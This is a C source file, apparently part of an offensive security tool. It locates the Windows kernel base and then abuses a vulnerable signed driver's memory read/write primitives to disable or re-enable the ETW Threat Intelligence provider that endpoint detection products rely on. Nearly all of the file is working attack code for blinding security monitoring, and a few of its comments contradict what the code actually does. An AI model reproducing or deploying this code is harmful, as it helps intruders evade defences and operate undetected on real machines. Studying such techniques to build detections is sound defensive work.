#include "common.h"

BOOL GetNtoskrnlBaseAddress(OUT LPVOID *pNtoskrnlBase) {

	BOOL								bSTATE			= TRUE;
	HMODULE								hNTDLL			= NULL; // Stores handle to ntdll.dll
	NTSTATUS							STATUS			= NULL; // Stores the NTSTATUS
	ULONG								uReturn1		= NULL; // Size returned in bytes from NtQuerySystemInformation
	ULONG								uReturn2		= NULL; // Size returned in bytes from NtQuerySystemInformation
	PSYSTEM_MODULE_INFORMATION			pModuleInfo		= NULL; // SYSTEM_MODULE_INFORMATION struct

	// Get handle to ntdll.dll
	// https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya
	hNTDLL = LoadLibraryA("ntdll.dll");
	if (!hNTDLL) {
		errorWin32("LoadLibraryA - Failed to get handle to ntdll.dll");
		bSTATE = FALSE;
		goto _cleanUp;
	}
	info_t("LoadLibraryA - Received handle to ntdll.dll 0x%p", hNTDLL);

	// Resolve address of NtQuerySystemInformation
	fnNtQuerySystemInformation NtQuerySystemInformation = (fnNtQuerySystemInformation)GetProcAddress(hNTDLL, "NtQuerySystemInformation");
	if (!NtQuerySystemInformation) {
		errorWin32("GetProcAddress - Failed to address of NtQuerySystemInformation");
		bSTATE = FALSE;
		goto _cleanUp;
	}
	info_t("GetProcAddress - Received address to NtQuerySystemInformation 0x%p", NtQuerySystemInformation);

	// Get the size of SYSTEM_MODULE_INFORMATION
	// https://learn.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntquerysysteminformation
	STATUS = NtQuerySystemInformation(
		SystemModuleInformation,		// Returns a SystemModuleInformation stuct
		NULL,							// Can be null the first time calling
		0,								// Can be null the first time calling
		&uReturn1						// Returned size
	);
	info_t("NtQuerySystemInformation - Received %lu bytes of SystemModuleInformation", uReturn1);

	// Allocate memory for SYSTEM_MODULE_INFORMATION
	pModuleInfo = (PSYSTEM_MODULE_INFORMATION)malloc(uReturn1);
	if (!pModuleInfo) {
		error("malloc - Failed to allocate memory");
		bSTATE = FALSE;
		goto _cleanUp;
	}
	info_t("Malloc - Allocated %lu bytes of memory at 0x%p", uReturn1, pModuleInfo);

	// Query the SYSTEM_MODULE_INFORMATION
	// https://learn.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntquerysysteminformation
	STATUS = NtQuerySystemInformation(
		SystemModuleInformation,		// Returns a SystemModuleInformation stuct
		pModuleInfo,					// Pointer to SYSTEM_CODEINTEGRITY_INFORMATION struct
		uReturn1,						// Size of the SYSTEM_CODEINTEGRITY_INFORMATION struct
		&uReturn2						// Returned size
	);
	if (!NT_SUCCESS(STATUS)) {
		errorNT("NtQuerySystemInformation failed", STATUS);
		bSTATE = FALSE;
		goto _cleanUp;
	}
	info_t("NtQuerySystemInformation - Received %lu bytes of SystemModuleInformation saved at 0x%p", uReturn2, pModuleInfo);

	// The first module in the list is typically ntoskrnl.exe
	*pNtoskrnlBase = pModuleInfo->Modules[0].ImageBase;

_cleanUp:

	if (pModuleInfo) {
		free(pModuleInfo);
	}

	return bSTATE;

}

BOOL ChangeETwTi(IN BOOL bDisable) {

	BOOL		bSTATE								= TRUE;
	DWORD64		dwNtoskrnlBaseAddress				= NULL; // Stores base address of ntoskrnl.exe
	DWORD64		dwEtwtiProvRegHandleBaseAddress		= NULL; // Stores base address of etwtiProvRegHandle
	HANDLE		hDevice								= NULL; // Saves handle to the device driver
	DWORD64		dwEtwti_ETW_REG_ENTRY				= NULL; // Stores value of the ETW_REG_ENTRY
	DWORD64		dwEtwti_ETW_GUID_ENTRY				= NULL; // Stores value of the ETW_GUID_ENTRY
	DWORD64		dwProviderEnableInfoAddress			= NULL; // Stores value of address of the ProviderEnableInfo
	DWORD		dwProviderEnableInfoValue1			= NULL; // Stores value of ProviderEnableInfo
	DWORD		dwProviderEnableInfoValue2			= NULL; // Stores value of ProviderEnableInfo

	// Get base address of ntoskrnl.exe
	if (!GetNtoskrnlBaseAddress(&dwNtoskrnlBaseAddress)){
		error("GetNtoskrnlBaseAddress - Failed to get base address of \"ntoskrnl.exe\"");
		bSTATE = FALSE;
		goto _cleanUp;
	}
	info_t("ChangeETwTi - ntoskrnl address: 0x%p", dwNtoskrnlBaseAddress)

	// Get the base address of ETwTi reg handle
	dwEtwtiProvRegHandleBaseAddress = dwNtoskrnlBaseAddress + g_ntoskrnlOffsets.st.etwThreatIntProvRegHandle;
	info_t("ChangeETwTi - dwEtwtiProvRegHandle address: 0x%p", dwEtwtiProvRegHandleBaseAddress);

	// Open a handle to the vulnerable driver using symbolik link
	hDevice = GetDeviceHandle(g_VULNDRIVERSYMLINK);
	if (hDevice == NULL) {
		error("GetDeviceHandle - Failed");
		bSTATE = FALSE;
		goto _cleanUp;
	}
	info_t("GetDeviceHandle - Handle to vulnerable driver 0x%p", hDevice);

	// Read the value of the ETWI provider registration handle
	dwEtwti_ETW_REG_ENTRY = ReadMemoryDWORD64(hDevice, dwEtwtiProvRegHandleBaseAddress);

	// Read the GUID entry from the ETWI registration
	dwEtwti_ETW_GUID_ENTRY = ReadMemoryDWORD64(hDevice, dwEtwti_ETW_REG_ENTRY + g_ntoskrnlOffsets.st.etwRegEntry_GuidEntry);

	// Calculate the address of the ProviderEnableInfo field within the GUID entry
	dwProviderEnableInfoAddress = dwEtwti_ETW_GUID_ENTRY + g_ntoskrnlOffsets.st.etwGuidEntry_ProviderEnableInfo;

	// Read the ProviderEnableInfo field within the GUID entry
	dwProviderEnableInfoValue1 = ReadMemoryBYTE(hDevice, dwProviderEnableInfoAddress);
	info_t("ReadMemoryBYTE - ETwTi ProviderEnableInfo value: 0x%02X", dwProviderEnableInfoValue1 & 0xFF);

	// If BOOL is true disable ETwTi otherwise enable it
	if (bDisable) {
		// Check if it isn't already enabled then error, otherwise change the value.
		if (dwProviderEnableInfoValue1 == 0x1) {
			error("ReadMemoryBYTE - ETwTi is already ENABLED (0x1) no action taken");
			bSTATE = FALSE;
			goto _cleanUp;
		}
		else {
			// Write 0x0 into dwProviderEnableInfoAddress enabling ETwTi
			info_t("WriteMemoryPrimitive - Enabling ETwTi provider");
			WriteMemoryPrimitive(hDevice, 1, dwProviderEnableInfoAddress, 0x1);
		}
	}
	else {
		// Check if it isn't already disabled then error, otherwise change the value.
		if (dwProviderEnableInfoValue1 == 0x0) {
			error("ReadMemoryBYTE - ETwTi is already DISABLED (0x0) no action taken");
			bSTATE = FALSE;
			goto _cleanUp;
		}
		else {
			// Write 0x0 into dwProviderEnableInfoAddress disabling ETwTi
			info_t("WriteMemoryPrimitive - Disabling ETwTi provider");
			WriteMemoryPrimitive(hDevice, 1, dwProviderEnableInfoAddress, 0x0);
		}
	}

	// Read the ProviderEnableInfo field within the GUID entry again
	dwProviderEnableInfoValue2 = ReadMemoryBYTE(hDevice, dwProviderEnableInfoAddress);
	info_t("ReadMemoryBYTE - ETwTi ProviderEnableInfo value: 0x%02X", dwProviderEnableInfoValue2 & 0xFF);

	// Check if the original value is different then the new value. If not then something went wrong
	if (dwProviderEnableInfoValue1 == dwProviderEnableInfoValue2) {
		error("ChangeETwTi - Value of ProviderEnableInfo should be changed but it wasn't");
		info_t("ChangeETwTi - Value of dwProviderEnableInfoValue1: 0x%02X", dwProviderEnableInfoValue1 & 0xFF);
		info_t("ChangeETwTi - Value of dwProviderEnableInfoValue2: 0x%02X", dwProviderEnableInfoValue2 & 0xFF);
		bSTATE = FALSE;
		goto _cleanUp;
	}

_cleanUp:

	// Close handle to device
	if (hDevice) {
		CloseHandle(hDevice);
	}

	return bSTATE;

}